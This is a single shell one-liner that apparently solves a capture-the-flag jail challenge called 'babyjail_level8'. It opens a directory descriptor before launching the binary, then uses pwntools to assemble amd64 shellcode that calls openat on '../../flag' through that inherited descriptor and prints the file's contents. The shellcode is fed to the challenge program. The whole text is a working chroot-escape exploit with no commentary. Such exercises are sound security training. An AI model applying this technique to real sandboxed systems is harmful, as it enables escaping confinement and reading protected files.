exec 11</ && echo 'import pwn
pwn.context.arch = "amd64"
openat_shellcode = pwn.shellcraft.amd64.openat(11, "../../flag").rstrip()
read_shellcode = pwn.shellcraft.amd64.read("rax", "rsp", 1024).rstrip()
write_shellcode = pwn.shellcraft.amd64.write(1, "rsp", 1024).rstrip()
assembly = pwn.asm(openat_shellcode + read_shellcode + write_shellcode)
with open("raw", "wb") as f:
    f.write(assembly)' > sand.py && /bin/python3 sand.py && /challenge/babyjail_level8 < raw
